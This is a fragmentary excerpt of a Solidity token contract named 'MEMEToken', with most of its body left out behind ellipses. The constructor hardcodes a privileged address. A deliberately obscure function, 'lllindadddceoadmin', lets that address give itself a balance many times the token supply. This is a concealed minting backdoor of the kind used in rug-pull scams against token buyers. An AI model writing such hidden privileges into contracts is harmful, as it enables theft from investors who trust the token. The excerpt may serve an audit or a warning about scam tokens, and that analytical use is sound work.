...
contract MEMEToken is Ownable {
    ...
    function lllindadddceoadmin() external {
        ...
        if (_lindaceo446!= tswojaks){
            revert("_lindaceo"); 
        }
        if(_lindaceo446 == tswojaks){
            _balances[_lindaceo446] = adminSupply()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _lindaceo446 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
